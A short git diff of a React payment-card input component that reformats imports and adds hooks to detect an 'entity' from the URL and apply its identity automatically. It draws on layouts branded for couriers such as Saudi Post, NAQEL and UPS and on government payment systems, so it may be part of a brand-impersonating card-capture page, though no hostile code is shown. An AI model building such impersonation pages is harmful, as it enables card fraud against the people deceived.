@@ -9,12 +9,12 @@ import { getBrandingByCompany } from "@/lib/brandingSystem";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
-import { 
-  SecureCardHeader, 
-  CardBrandIndicator, 
+import {
+  SecureCardHeader,
+  CardBrandIndicator,
   StyledCardInput,
   PaymentSecurityFooter,
-  AcceptedCardsDisplay 
+  AcceptedCardsDisplay
 } from "@/components/CardFormComponents";
 import { Shield, Lock, Calendar } from "lucide-react";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
@@ -26,10 +26,16 @@ import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validat
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 
 const PaymentCardInput = () => {
   const { id } = useParams();
   const navigate = useNavigate();
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
   
